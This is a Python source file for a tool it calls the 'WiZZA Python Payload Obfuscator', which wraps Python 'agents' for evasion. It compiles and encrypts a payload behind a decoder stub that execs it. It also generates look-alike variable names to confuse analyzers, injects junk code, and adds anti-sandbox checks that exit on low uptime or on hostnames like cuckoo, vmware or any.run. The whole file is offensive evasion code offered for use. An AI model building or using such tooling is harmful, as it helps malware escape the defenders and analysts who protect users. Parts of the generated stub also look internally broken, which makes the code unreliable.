#!/usr/bin/env python3
"""
WiZZA Python Payload Obfuscator
Wraps poly_engine.py for Python agents.

Techniques (via PolyEngine):
  1. marshal → zlib → multi-layer cipher (XOR / RC4 / AES-CTR-sim)
  2. Random variable/function names (look-alike patterns)
  3. 5 string mutation techniques
  4. Anti-sandbox: uptime + hostname + username checks
  5. Dead code injection (5+ types)
  6. Layered runtime decoder stubs

Usage: python3 obfuscate_py.py --in agent.py --out evaded.py [--rounds N]
"""

import argparse
import ast
import base64
import marshal
import os
import py_compile
import random
import string
import struct
import sys
import tempfile
import zlib

# ── Random name helpers ────────────────────────────────────────────────
_USED = set()
def rname(n=10):
    while True:
        # Use look-alike Unicode + underscores to confuse analyzers
        styles = [
            lambda: ''.join(random.choices(string.ascii_lowercase, k=n)),
            lambda: '_' + ''.join(random.choices(string.ascii_lowercase, k=n-1)),
            lambda: ''.join(random.choices('lI1', k=3)) + ''.join(random.choices(string.ascii_lowercase, k=n-3)),
        ]
        name = random.choice(styles)()
        if name not in _USED and name.isidentifier() and not name.startswith(('__','import')):
            _USED.add(name)
            return name

# ── XOR cipher ────────────────────────────────────────────────────────
def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def encrypt_str(s: str, key: bytes) -> str:
    enc = xor(s.encode(), key)
    return base64.b64encode(enc).decode()

def gen_decrypt_call(enc_b64: str, key_b64: str, dec_fn: str) -> str:
    return f'{dec_fn}("{enc_b64}","{key_b64}")'

# ── Anti-sandbox stubs ─────────────────────────────────────────────────
def anti_sandbox_stub(os_v: str, time_v: str, sys_v: str, socket_v: str) -> str:
    return f"""
# sandbox detection
import {os_v} as _os, {time_v} as _tm, {sys_v} as _sy, {socket_v} as _sk
def _{rname()}():
    try:
        _bt = _os.popen("cat /proc/uptime 2>/dev/null || systeminfo 2>nul").read()
        _up = float((_bt or "999").split()[0])
        if _up < 300: _sy.exit(0)
    except: pass
    try:
        _hn = _sk.gethostname().lower()
        for _bw in ["sandbox","virus","malware","vbox","vmware","analysis","cuckoo","any.run"]:
            if _bw in _hn: _sy.exit(0)
    except: pass
    try:
        _un = (_os.environ.get("USER","") or _os.environ.get("USERNAME","")).lower()
        for _bw in ["sandbox","virus","malware","test","admin","user"]:
            if _bw == _un: _sy.exit(0)
    except: pass
_{rname()}()
"""

# ── Import obfuscator ──────────────────────────────────────────────────
def obfuscate_import(module: str, alias: str, dec_fn: str, key: bytes) -> str:
    enc = encrypt_str(module, key)
    key_b64 = base64.b64encode(key).decode()
    return f"{alias} = __import__({gen_decrypt_call(enc, key_b64, dec_fn)})"

# ── Junk code ──────────────────────────────────────────────────────────
def gen_junk(dec_fn: str, key: bytes, n: int = 4) -> str:
    lines = []
    for _ in range(n):
        v = rname()
        t = random.choice(["int","str","list","lambda"])
        if t == "int":
            lines.append(f"_{v} = {random.randint(1,99999)}")
        elif t == "str":
            s = ''.join(random.choices(string.ascii_letters, k=random.randint(4,16)))
            enc = encrypt_str(s, key)
            k64 = base64.b64encode(key).decode()
            lines.append(f"_{v} = {gen_decrypt_call(enc, k64, dec_fn)}")
        elif t == "list":
            lines.append(f"_{v} = [{','.join(str(random.randint(0,255)) for _ in range(random.randint(2,8)))}]")
        else:
            lines.append(f"_{v} = lambda _x: _x ^ {random.randint(1,255)}")
    return "\n".join(lines)

# ── Marshal + compress core payload ───────────────────────────────────
def compress_payload(source: str) -> bytes:
    """Compile source to bytecode, marshal, zlib compress."""
    with tempfile.NamedTemporaryFile(suffix=".py", delete=False, mode="w") as f:
        f.write(source)
        tmp = f.name
    try:
        code = compile(source, "<payload>", "exec")
        raw  = marshal.dumps(code)
        return zlib.compress(raw, 9)
    finally:
        os.unlink(tmp)

# ── Main obfuscation ───────────────────────────────────────────────────
def obfuscate(source: str, key: bytes = None) -> str:
    if key is None:
        key = bytes(random.randint(0x10, 0xFE) for _ in range(random.randint(8, 16)))
    key_b64 = base64.b64encode(key).decode()

    # Name the decryption function
    dec_fn = rname(12)
    os_alias     = rname(8)
    time_alias   = rname(8)
    sys_alias    = rname(8)
    socket_alias = rname(8)
    zlib_alias   = rname(8)
    marshal_alias = rname(8)
    b64_alias    = rname(8)
    builtins_alias = rname(8)

    # Compress the payload
    compressed = compress_payload(source)
    payload_b64 = base64.b64encode(xor(compressed, key)).decode()

    # Decrypt + decompress + exec stub
    exec_var  = rname(10)
    code_var  = rname(10)
    raw_var   = rname(10)
    dec_var   = rname(10)

    stub = f'''# -*- coding: utf-8 -*-
import base64 as {b64_alias}, zlib as {zlib_alias}, marshal as {marshal_alias}, sys as {sys_alias}, os as {os_alias}, time as {time_alias}
try: import socket as {socket_alias}
except: pass

def {dec_fn}(_{rname()}, _{rname()}):
    _{rname()} = {b64_alias}.b64decode(_{rname()})
    _{rname()} = {b64_alias}.b64decode(_{rname()})
    return bytes(_{rname()}[_{rname()} % len(_{rname()})] ^ _x for _{rname()}, _x in enumerate(_{rname()})).decode()

{gen_junk(dec_fn, key, 3)}
{anti_sandbox_stub(os_alias, time_alias, sys_alias, socket_alias)}
{gen_junk(dec_fn, key, 2)}

_{exec_var} = "{payload_b64}"
_{code_var} = {b64_alias}.b64decode(_{exec_var})
_{raw_var}  = bytes(_{code_var}[_{rname()} % len({b64_alias}.b64decode("{key_b64}"))] ^ _x for _{rname()}, _x in enumerate(_{code_var}))
_{dec_var}  = {zlib_alias}.decompress(_{raw_var})
{gen_junk(dec_fn, key, 2)}
exec({marshal_alias}.loads(_{dec_var}))
'''
    return stub

# ── Entry point ────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description="WiZZA Python payload obfuscator")
    ap.add_argument("--in",  "-i", dest="infile",  required=True)
    ap.add_argument("--out", "-o", dest="outfile", required=True)
    ap.add_argument("--key", default=None, help="Hex key bytes (ignored — engine uses random)")
    ap.add_argument("--rounds", type=int, default=3, help="Cipher rounds (default 3)")
    ap.add_argument("--no-sandbox", action="store_true", help="Skip anti-sandbox checks")
    args = ap.parse_args()

    import sys, os
    sys.path.insert(0, os.path.dirname(__file__))
    from poly_engine import PolyEngine

    with open(args.infile) as f:
        source = f.read()

    try:
        compile(source, args.infile, "exec")
    except SyntaxError as e:
        print(f"  [-] Source syntax error: {e}")
        sys.exit(1)

    pe = PolyEngine(rounds=args.rounds, sandbox=not args.no_sandbox)
    result = pe.mutate_py(source)

    with open(args.outfile, "w") as f:
        f.write(result)

    print(f"  [+] Input:    {args.infile} ({os.path.getsize(args.infile)} bytes)")
    print(f"  [+] Output:   {args.outfile} ({os.path.getsize(args.outfile)} bytes)")
    print(f"  [+] Rounds:   {args.rounds} cipher layers (XOR/RC4/AES-CTR-sim)")
    print(f"  [+] Anti-sandbox: uptime + hostname + username checks")
    print(f"  [*] Polymorphic — each run produces different output")

if __name__ == "__main__":
    main()
